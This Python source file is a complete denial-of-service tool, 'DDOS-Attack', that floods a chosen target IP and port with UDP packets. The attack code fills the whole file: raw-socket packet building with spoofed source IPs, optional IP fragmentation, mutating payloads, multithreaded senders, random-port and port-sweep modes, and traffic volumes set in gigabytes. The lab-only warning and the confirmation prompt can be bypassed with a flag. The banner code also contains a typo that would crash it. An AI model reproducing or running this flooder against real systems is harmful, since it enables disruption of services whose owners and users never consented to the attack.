#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import re
import time
import signal
import socket
import ipaddress
import random
import struct
import argparse
import threading
import subprocess
import errno as errno_mod


# ==================== Global constants ====================
IP_HEADER_LEN = 20
UDP_HEADER_LEN = 8
DEFAULT_MTU = 1500
MAX_PAYLOAD_DF = DEFAULT_MTU - IP_HEADER_LEN - UDP_HEADER_LEN  # 1472


# ==================== Cross-platform clear screen ====================
def clear_screen():
    # Clear screen, compatible with Windows (cls) and Unix-like (clear)
    os.system('cls' if os.name == 'nt' else 'clear')


# ==================== Logger (console + file) ====================
class Logger:
    # Console + file output, thread-safe, flushable
    def __init__(self, log_file=None, quiet=False):
        self.lock = threading.Lock()
        self.fp = None
        self.quiet = quiet
        if log_file:
            try:
                self.fp = open(log_file, 'a', encoding='utf-8')
                self.fp.write(f"\n--- Session started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                self.fp.flush()
            except OSError as e:
                print(f"[!] Cannot open log file: {e}", file=sys.stderr)
                self.fp = None

    def log(self, msg):
        # File only if --quiet
        with self.lock:
            if not self.quiet:
                print(msg)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def err(self, msg):
        # Errors always go to stderr + file
        with self.lock:
            if not self.quiet:
                print(msg, file=sys.stderr)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def close(self):
        with self.lock:
            if self.fp:
                self.fp.close()
                self.fp = None


# ==================== Banner ====================
def show_banner(logger, no_banner=False):
    if no_banner:
        return
    clear_screen()
    logger.log("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    logger.log("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
    logger.log("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
    logger.log("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
    logger.log("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
    logger.log("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
    logger.log("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
    logger.log("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    logger.log("====================== SEVERE WARNING =======================")
    logger.log("You are crossing the legal and ethical boundary. ")
    longer.log("Exit now, or wait 3s.")
    logger.log("Authorized isolated lab environments only.")
    logger.log("=============================================================")
    time.sleep(1)
    logger.log("3"); time.sleep(1)
    logger.log("2"); time.sleep(1)
    logger.log("1"); time.sleep(1)
    logger.log("Starting...")
    time.sleep(1)

    clear_screen()
    if os.name != 'nt':
        ret = os.system("figlet DDOS-Attack 2>/dev/null")
    else:
        ret = os.system("figlet DDOS-Attack 2>nul")
    if ret != 0:
        logger.log(r" ____  ____   ___  ____          _   _   _             _     ")
        logger.log(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
        logger.log(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
        logger.log(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
        logger.log(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")
    logger.log("==================================================================")
    logger.log("Author  : Su-StackTrace")
    logger.log("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
    logger.log("==================================================================")
    logger.log("")


# ==================== Checksums ====================
def ip_checksum(data):
    # RFC 1071 16-bit one's complement checksum
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def udp_checksum(src_ip, dst_ip, udp_hdr, payload):
    # UDP checksum needs pseudo-header
    pseudo = (socket.inet_aton(src_ip) +
              socket.inet_aton(dst_ip) +
              b'\x00\x11' +
              struct.pack('!H', len(udp_hdr) + len(payload)))
    result = ip_checksum(pseudo + udp_hdr + payload)
    # Use 0xFFFF when result is 0, to avoid firewalls skipping it
    return result if result != 0 else 0xFFFF


# ==================== Local network detection ====================
def get_local_ip():
    # Probe egress IP via UDP connect
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def get_local_net(local_ip, override=None):
    # User override > system command > /24 fallback
    if override:
        try:
            return ipaddress.ip_network(override, strict=False), "user-specified"
        except ValueError:
            pass
    if not local_ip:
        return None, "no-local-ip"
    # Linux: ip -o -4 addr show
    try:
        r = subprocess.run(['ip', '-o', '-4', 'addr', 'show'],
                           capture_output=True, text=True, timeout=2)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if local_ip in line:
                    m = re.search(r'inet\s+([\d.]+/\d+)', line)
                    if m:
                        return ipaddress.ip_network(m.group(1), strict=False), "ip-command"
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass
    # macOS/BSD: ifconfig
    try:
        r = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=2)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if 'inet ' in line and local_ip in line:
                    m = re.search(r'inet\s+([\d.]+)\s+netmask\s+(0x[0-9a-fA-F]+)', line)
                    if m:
                        mask_int = int(m.group(2), 16)
                        prefix = bin(mask_int).count('1')
                        return ipaddress.ip_network(f"{m.group(1)}/{prefix}", strict=False), "ifconfig"
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass
    return ipaddress.ip_network(f"{local_ip}/24", strict=False), "fallback-/24"


# ==================== Spoof IP validation ====================
def validate_spoof_ip(spoof_ip, target_ip, local_net):
    # Returns (is_valid, message)
    try:
        s = ipaddress.ip_address(spoof_ip)
        t = ipaddress.ip_address(target_ip)
    except ValueError:
        return False, "Invalid IP"
    if not isinstance(s, ipaddress.IPv4Address):
        return False, "IPv4 only"
    if s.is_loopback:
        return False, f"Reject {spoof_ip}: loopback"
    if s.is_multicast:
        return False, f"Reject {spoof_ip}: multicast"
    if s.is_unspecified:
        return False, f"Reject {spoof_ip}: 0.0.0.0 meaningless"
    if s.is_reserved:
        return False, f"Reject {spoof_ip}: reserved"
    if s.is_link_local:
        return False, f"Reject {spoof_ip}: link-local"
    if s == t:
        return False, "Reject: spoof IP must not equal target"
    if local_net and s not in local_net:
        return True, (f"Warning: {spoof_ip} outside local subnet {local_net}; "
                      f"cross-route spoofing will be filtered by uRPF")
    return True, f"OK: {spoof_ip} within local subnet {local_net}"


# ==================== Packet construction ====================
def build_udp_header_for(src_ip, dst_ip, src_port, dst_port, payload):
    # UDP segment with correct checksum
    udp_len = UDP_HEADER_LEN + len(payload)
    hdr = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    chk = udp_checksum(src_ip, dst_ip, hdr, payload)
    return struct.pack('!HHHH', src_port, dst_port, udp_len, chk) + payload


def build_ip_udp_df(spoof_ip, target_ip, src_port, dst_port, payload, ttl, ip_id):
    # DF mode: single unfragmented packet
    total_len = IP_HEADER_LEN + UDP_HEADER_LEN + len(payload)
    udp_segment = build_udp_header_for(spoof_ip, target_ip, src_port, dst_port, payload)
    ip_frag_off = 0x4000  # DF=1
    ip_saddr = socket.inet_aton(spoof_ip)
    ip_daddr = socket.inet_aton(target_ip)
    hdr = struct.pack('!BBHHHBBH4s4s',
                      0x45, 0, total_len,
                      ip_id, ip_frag_off,
                      ttl, socket.IPPROTO_UDP, 0,
                      ip_saddr, ip_daddr)
    chk = ip_checksum(hdr)
    hdr = struct.pack('!BBHHHBBH4s4s',
                      0x45, 0, total_len,
                      ip_id, ip_frag_off,
                      ttl, socket.IPPROTO_UDP, chk,
                      ip_saddr, ip_daddr)
    return hdr + udp_segment


def build_ip_udp_fragmented(spoof_ip, target_ip, src_port, dst_port, payload, ttl, ip_id, mtu):
    # True IP fragmentation: returns list of complete IP fragments
    udp_segment = build_udp_header_for(spoof_ip, target_ip, src_port, dst_port, payload)
    total_data = len(udp_segment)
    max_data = ((mtu - IP_HEADER_LEN) // 8) * 8
    if max_data < 8:
        raise ValueError(f"MTU {mtu} too small to fragment")
    ip_saddr = socket.inet_aton(spoof_ip)
    ip_daddr = socket.inet_aton(target_ip)
    fragments = []
    offset = 0
    while offset < total_data:
        chunk = udp_segment[offset:offset + max_data]
        is_last = (offset + len(chunk)) >= total_data
        mf = 0 if is_last else 1
        frag_off = offset // 8
        flag_off = (mf << 13) | frag_off
        total_len = IP_HEADER_LEN + len(chunk)
        hdr = struct.pack('!BBHHHBBH4s4s',
                          0x45, 0, total_len,
                          ip_id, flag_off,
                          ttl, socket.IPPROTO_UDP, 0,
                          ip_saddr, ip_daddr)
        chk = ip_checksum(hdr)
        hdr = struct.pack('!BBHHHBBH4s4s',
                          0x45, 0, total_len,
                          ip_id, flag_off,
                          ttl, socket.IPPROTO_UDP, chk,
                          ip_saddr, ip_daddr)
        fragments.append(hdr + chunk)
        offset += len(chunk)
    return fragments


# ==================== Variant payload pool ====================
def build_variant_pool(base_size, pool_size, vary=True):
    # Each pool item has length within ±10% of base_size, random content
    rnd = random.Random()
    delta = max(1, base_size // 10) if vary else 0
    pool = []
    for _ in range(pool_size):
        length = base_size - delta + (rnd.randint(0, delta * 2) if delta else 0)
        length = max(28, min(length, 65000))
        pool.append(bytearray(rnd.getrandbits(8) for _ in range(length)))
    return pool


def mutate_payload(payload, counter, rnd):
    # Tail 8 bytes = counter, head 16 bytes XOR-flipped
    n = len(payload)
    if n >= 8:
        c = counter
        for b in range(8):
            payload[n - 1 - b] = c & 0xFF
            c >>= 8
    if n >= 24:
        for b in range(16):
            idx = 4 + b
            payload[idx] ^= rnd.randint(0, 255)


# ==================== Precise rate control ====================
class PreciseRateLimiter:
    # perf_counter_ns cumulative timeline to avoid sleep drift
    def __init__(self, interval_sec):
        self.interval_ns = int(interval_sec * 1e9) if interval_sec > 0 else 0
        self.next_tick_ns = time.perf_counter_ns()

    def wait(self):
        if self.interval_ns <= 0:
            return
        self.next_tick_ns += self.interval_ns
        now_ns = time.perf_counter_ns()
        sleep_ns = self.next_tick_ns - now_ns
        if sleep_ns <= 0:
            self.next_tick_ns = now_ns
            return
        if sleep_ns > 1_500_000:
            time.sleep((sleep_ns - 500_000) / 1e9)
        while time.perf_counter_ns() < self.next_tick_ns:
            pass


# ==================== Bandwidth protection ====================
class BandwidthGuard:
    # Limits both packet rate and byte rate
    def __init__(self, max_pps, max_mbps):
        self.max_pps = max_pps
        self.max_bytes_per_sec = max_mbps * 1024 * 1024 / 8 if max_mbps > 0 else 0
        self.window_start = time.perf_counter()
        self.window_packets = 0
        self.window_bytes = 0
        self.lock = threading.Lock()

    def allow(self, pkt_bytes):
        if self.max_pps <= 0 and self.max_bytes_per_sec <= 0:
            return True
        now = time.perf_counter()
        with self.lock:
            elapsed = now - self.window_start
            if elapsed >= 1.0:
                self.window_start = now
                self.window_packets = 0
                self.window_bytes = 0
            if self.max_pps > 0 and self.window_packets >= self.max_pps:
                return False
            if self.max_bytes_per_sec > 0 and self.window_bytes + pkt_bytes > self.max_bytes_per_sec:
                return False
            self.window_packets += 1
            self.window_bytes += pkt_bytes
            return True


# ==================== Statistics ====================
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.bytes_sent = 0
        self.dropped = 0
        self.icmp_unreach = 0
        self.err_counters = {}

    def add_sent(self, n, b):
        with self.lock:
            self.sent += n
            self.bytes_sent += b

    def add_dropped(self, n=1):
        with self.lock:
            self.dropped += n

    def add_icmp(self):
        with self.lock:
            self.icmp_unreach += 1

    def add_error(self, category):
        with self.lock:
            self.err_counters[category] = self.err_counters.get(category, 0) + 1

    def snapshot(self):
        with self.lock:
            return {
                'sent': self.sent,
                'bytes': self.bytes_sent,
                'dropped': self.dropped,
                'icmp_unreach': self.icmp_unreach,
                'errors': dict(self.err_counters),
            }


# ==================== Error classification ====================
def classify_send_error(e):
    if isinstance(e, BlockingIOError):
        return "EAGAIN"
    if isinstance(e, BufferError):
        return "ENOBUFS"
    if isinstance(e, ConnectionRefusedError):
        return "ICMP_PORT_UNREACH"
    if isinstance(e, PermissionError):
        return "EACCES"
    if isinstance(e, OSError):
        code = e.errno
        if code == errno_mod.ENOBUFS:
            return "ENOBUFS"
        if code == errno_mod.EMSGSIZE:
            return "EMSGSIZE"
        if code == errno_mod.EHOSTUNREACH:
            return "EHOSTUNREACH"
        if code == errno_mod.ENETUNREACH:
            return "ENETUNREACH"
        if code == errno_mod.EACCES:
            return "EACCES"
        if code == errno_mod.EPERM:
            return "EPERM"
        return f"E{code}"
    return "UNKNOWN"


# ==================== UDP probe ====================
def udp_probe(target_ip, target_port, timeout=0.5):
    # Send empty UDP packet, try to catch ICMP unreachable
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.connect((target_ip, target_port))
        s.send(b'\x00')
        try:
            s.recv(1024)
            s.close()
            return "open"
        except ConnectionRefusedError:
            s.close()
            return "closed"
        except socket.timeout:
            s.close()
            return "unknown"
    except OSError:
        return "unknown"


# ==================== ICMP listener ====================
def icmp_listener(stats, stop_event, logger):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.settimeout(0.5)
    except PermissionError:
        logger.log("[>] ICMP listener requires root, skipped")
        return
    except OSError:
        return
    logger.log("[>] ICMP listener started")
    while not stop_event.is_set():
        try:
            data, addr = s.recvfrom(2048)
        except socket.timeout:
            continue
        except OSError:
            break
        if len(data) < 20:
            continue
        try:
            ihl = (data[0] & 0x0F) * 4
            icmp_type = data[ihl]
            if icmp_type == 3:
                stats.add_icmp()
        except IndexError:
            pass
    s.close()


# ==================== Sender worker ====================
def sender_worker(thread_id, target_ip, target_port, spoof_ip, config, stats,
                  stop_event, logger):
    rnd = random.Random(thread_id * 0x9E3779B1)
    pool = build_variant_pool(config['packet_size'], config['pool_size'], config['vary'])
    ip_id_base = rnd.randint(1, 0xFFFF)
    rate_limiter = PreciseRateLimiter(config['rate_limit'])
    guard = config['guard']
    src_port_fixed = config['src_port']
    ttl = config['ttl']
    use_spoof = spoof_ip is not None
    df_mode = not config['fragment']
    local_target_port = target_port

    sock = None
    try:
        if use_spoof:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if src_port_fixed is not None:
                try:
                    sock.bind(('', src_port_fixed + thread_id))
                except OSError as e:
                    logger.err(f"[!] T{thread_id}: bind source port failed: {e}")
    except PermissionError:
        logger.err(f"[!] T{thread_id}: permission denied, root required")
        return
    except OSError as e:
        logger.err(f"[!] T{thread_id}: socket creation failed: {e}")
        return

    counter = 0
    consecutive_fail = 0
    while not stop_event.is_set() and stats.snapshot()['sent'] < config['max_packets']:
        for _ in range(config['burst_size']):
            if stop_event.is_set():
                break
            if stats.snapshot()['sent'] >= config['max_packets']:
                break

            payload = pool[counter % len(pool)]
            mutate_payload(payload, counter, rnd)
            counter += 1

            if config['random_port']:
                dst_port = rnd.randint(1, 65535)
            elif config['port_sweep']:
                dst_port = ((local_target_port - 1 + counter) % 65535) + 1
            else:
                dst_port = target_port

            if src_port_fixed is not None:
                src_port = src_port_fixed + thread_id
            else:
                src_port = rnd.randint(1024, 65535)

            pkt_size_est = config['packet_size']
            if not guard.allow(pkt_size_est):
                time.sleep(0.001)
                continue

            try:
                if use_spoof:
                    ip_id = (ip_id_base + counter) & 0xFFFF
                    if ip_id == 0:
                        ip_id = 1
                    if df_mode:
                        pkt = build_ip_udp_df(spoof_ip, target_ip, src_port,
                                              dst_port, bytes(payload), ttl, ip_id)
                        sock.sendto(pkt, (target_ip, 0))
                        stats.add_sent(1, len(pkt))
                    else:
                        frags = build_ip_udp_fragmented(spoof_ip, target_ip, src_port,
                                                         dst_port, bytes(payload),
                                                         ttl, ip_id, config['mtu'])
                        for f in frags:
                            sock.sendto(f, (target_ip, 0))
                        stats.add_sent(1, sum(len(f) for f in frags))
                else:
                    sock.sendto(payload, (target_ip, dst_port))
                    stats.add_sent(1, len(payload))
                consecutive_fail = 0
            except OSError as e:
                category = classify_send_error(e)
                stats.add_dropped(1)
                stats.add_error(category)
                consecutive_fail += 1
                if consecutive_fail >= 3:
                    backoff_ms = min(1000, 10 << min(consecutive_fail - 3, 6))
                    time.sleep(backoff_ms / 1000.0)

        rate_limiter.wait()


# ==================== Argument parsing ====================
def parse_args():
    p = argparse.ArgumentParser(
        description="UDP Flood with Source IP Spoofing (authorized lab only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
               "  python3 DDOS-Attack_03_e.py -t 10.0.0.1 -p 53 -g 1 --spoof 10.0.0.99\n"
               "  python3 DDOS-Attack_03_e.py -t 10.0.0.1 -p 53 -g 1 --spoof 10.0.0.99 --fragment\n"
    )
    p.add_argument('-t', '--target', help='Target IP')
    p.add_argument('-p', '--port', type=int, help='Target port')
    p.add_argument('-g', '--gb', type=float, help='Total traffic (GB)')
    p.add_argument('--spoof', help='Spoof source IP (requires root)')
    p.add_argument('--size', type=int, default=MAX_PAYLOAD_DF, help='Packet size in bytes')
    p.add_argument('--mtu', type=int, default=DEFAULT_MTU, help='Fragmentation MTU')
    p.add_argument('--ttl', type=int, default=64, help='TTL')
    p.add_argument('-P', '--threads', type=int, default=0, help='Thread count (0=auto)')
    p.add_argument('-b', '--burst', type=int, default=50, help='Packets per burst')
    p.add_argument('-r', '--rate', type=float, default=0.0, help='Seconds per burst')
    p.add_argument('--src-port', type=int, default=None, help='Source port base')
    p.add_argument('--random-port', action='store_true', help='Random target port')
    p.add_argument('--port-sweep', action='store_true', help='Increment target port')
    p.add_argument('--fragment', action='store_true', help='Enable true IP fragmentation')
    p.add_argument('--no-vary', action='store_true', help='Disable payload variation')
    p.add_argument('--pool-size', type=int, default=256, help='Payload pool size')
    p.add_argument('--max-pps', type=int, default=0, help='Packet rate cap (0=unlimited)')
    p.add_argument('--max-mbps', type=int, default=0, help='Bandwidth cap Mbps (0=unlimited)')
    p.add_argument('--local-subnet', help='Local subnet override')
    p.add_argument('--log', help='Log file path')
    p.add_argument('--no-banner', action='store_true', help='Skip startup banner')
    p.add_argument('--quiet', action='store_true', help='File only, no console')
    p.add_argument('--no-check', action='store_true', help='Skip connectivity probe')
    p.add_argument('--no-icmp', action='store_true', help='Disable ICMP listener')
    p.add_argument('--no-interactive', action='store_true', help='Skip all prompts')
    return p.parse_args()


# ==================== Main ====================
def main():
    args = parse_args()
    logger = Logger(args.log, args.quiet)
    show_banner(logger, args.no_banner)

    if not args.target:
        args.target = input("[?] Target IP: ").strip()
    try:
        ipaddress.ip_address(args.target)
    except ValueError:
        logger.err("[!] Invalid target IP")
        return 1
    if args.port is None:
        try:
            args.port = int(input("[?] Target port: ").strip())
        except ValueError:
            logger.err("[!] Invalid port")
            return 1
    if not (1 <= args.port <= 65535):
        logger.err("[!] Port must be in 1-65535")
        return 1
    if args.gb is None:
        try:
            args.gb = float(input("[?] Total traffic (GB): ").strip())
        except ValueError:
            logger.err("[!] Invalid traffic value")
            return 1
    if args.gb <= 0:
        logger.err("[!] Traffic must be > 0")
        return 1

    local_ip = get_local_ip()
    local_net, net_source = get_local_net(local_ip, args.local_subnet)
    if local_ip:
        logger.log(f"[>] Local egress IP: {local_ip}")
    if local_net:
        logger.log(f"[>] Local subnet: {local_net} (source: {net_source})")

    if args.spoof:
        valid, msg = validate_spoof_ip(args.spoof, args.target, local_net)
        if not valid:
            logger.err(f"[!] {msg}")
            return 1
        logger.log(f"[>] {msg}")
        if args.fragment:
            logger.log(f"[>] True IP fragmentation enabled (MTU={args.mtu})")
        else:
            logger.log(f"[>] DF mode (no fragmentation)")

    if args.fragment:
        if args.size > args.mtu - IP_HEADER_LEN:
            logger.log(f"[!] payload > MTU-{IP_HEADER_LEN}, truncated to {args.mtu - IP_HEADER_LEN}")
            args.size = args.mtu - IP_HEADER_LEN
    else:
        if args.size > MAX_PAYLOAD_DF:
            logger.log(f"[!] DF mode caps payload at {MAX_PAYLOAD_DF}, truncated")
            args.size = MAX_PAYLOAD_DF
    if args.size < 28:
        args.size = 28

    total_bytes = int(args.gb * 1024 * 1024 * 1024)
    max_packets = total_bytes // args.size
    if max_packets <= 0:
        logger.err("[!] Traffic too small")
        return 1

    threads = args.threads
    if threads <= 0:
        threads = max(2, (os.cpu_count() or 4) // 2)

    logger.log(f"\n[>] Target: {args.target}:{args.port}")
    logger.log(f"[>] Total traffic: {args.gb:.2f} GB ({max_packets} packets)")
    logger.log(f"[>] Packet size: {args.size} bytes")
    logger.log(f"[>] Threads: {threads}")
    if args.spoof:
        logger.log(f"[>] Spoof source IP: {args.spoof}")
    else:
        logger.log(f"[>] Plain UDP mode")
    if args.random_port:
        logger.log("[>] Random target port: ON")
    if args.port_sweep:
        logger.log("[>] Target port sweep: ON")
    if args.max_pps > 0:
        logger.log(f"[>] Packet rate cap: {args.max_pps} pps")
    if args.max_mbps > 0:
        logger.log(f"[>] Bandwidth cap: {args.max_mbps} Mbps")

    if not args.no_check and not args.no_interactive:
        logger.log("[>] UDP probe target port...")
        result = udp_probe(args.target, args.port, timeout=0.5)
        logger.log(f"[>] Probe result: {result}")
        if result == "closed":
            logger.log("[!] Port shows as closed (ICMP unreachable), but might still be filtered")
        elif result == "unknown":
            logger.log("[>] No response, cannot determine (normal UDP behavior)")

    if not args.no_interactive:
        print("\n[!] Final warning: confirm this is a device you are authorized to test.")
        try:
            confirm = input("[?] Confirm (yes/no): ").strip().lower()
        except EOFError:
            confirm = "no"
        if confirm != "yes":
            logger.log("[>] User cancelled")
            logger.close()
            return 0

    config = {
        'packet_size': args.size,
        'mtu': args.mtu,
        'ttl': args.ttl,
        'burst_size': args.burst,
        'rate_limit': args.rate,
        'src_port': args.src_port,
        'random_port': args.random_port,
        'port_sweep': args.port_sweep,
        'fragment': args.fragment,
        'vary': not args.no_vary,
        'pool_size': args.pool_size,
        'max_packets': max_packets,
        'guard': BandwidthGuard(args.max_pps, args.max_mbps),
    }

    stats = Stats()
    stop_event = threading.Event()

    def on_sigint(sig, frame):
        stop_event.set()
        logger.log("\n[!] Ctrl+C received, stopping...")
    signal.signal(signal.SIGINT, on_sigint)

    icmp_thread = None
    if not args.no_icmp and args.spoof:
        icmp_thread = threading.Thread(target=icmp_listener,
                                       args=(stats, stop_event, logger),
                                       daemon=True)
        icmp_thread.start()

    logger.log(f"\n[>] Starting {threads} sender threads...")
    workers = []
    for i in range(threads):
        t = threading.Thread(target=sender_worker,
                             args=(i, args.target, args.port, args.spoof,
                                   config, stats, stop_event, logger),
                             daemon=True)
        t.start()
        workers.append(t)

    start_time = time.perf_counter()
    last_report = start_time
    last_sent = 0
    try:
        while not stop_event.is_set():
            time.sleep(0.5)
            now = time.perf_counter()
            elapsed = now - start_time
            snap = stats.snapshot()
            if snap['sent'] >= max_packets:
                break
            if now - last_report >= 1.0:
                delta_sent = snap['sent'] - last_sent
                inst_rate = delta_sent / (now - last_report)
                rate = snap['sent'] / elapsed if elapsed > 0 else 0
                gb = snap['bytes'] / (1024 ** 3)
                logger.log(f"[>] {snap['sent']}/{max_packets} | {gb:.4f} GB | "
                           f"{rate:.0f} pps | inst={inst_rate:.0f} | "
                           f"drop={snap['dropped']} | icmp={snap['icmp_unreach']}")
                last_report = now
                last_sent = snap['sent']
    except KeyboardInterrupt:
        pass

    stop_event.set()
    for t in workers:
        t.join(timeout=2)

    snap = stats.snapshot()
    elapsed = time.perf_counter() - start_time
    gb = snap['bytes'] / (1024 ** 3)
    rate = snap['sent'] / elapsed if elapsed > 0 else 0
    logger.log(f"\n[>] Done:")
    logger.log(f"    Packets sent: {snap['sent']}")
    logger.log(f"    Packets dropped: {snap['dropped']}")
    logger.log(f"    ICMP unreachable: {snap['icmp_unreach']}")
    logger.log(f"    Total data: {gb:.4f} GB")
    logger.log(f"    Elapsed: {elapsed:.2f}s")
    logger.log(f"    Average rate: {rate:.1f} pps")
    if snap['errors']:
        logger.log(f"    Error breakdown:")
        for k, v in sorted(snap['errors'].items()):
            logger.log(f"      {k}: {v}")

    logger.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
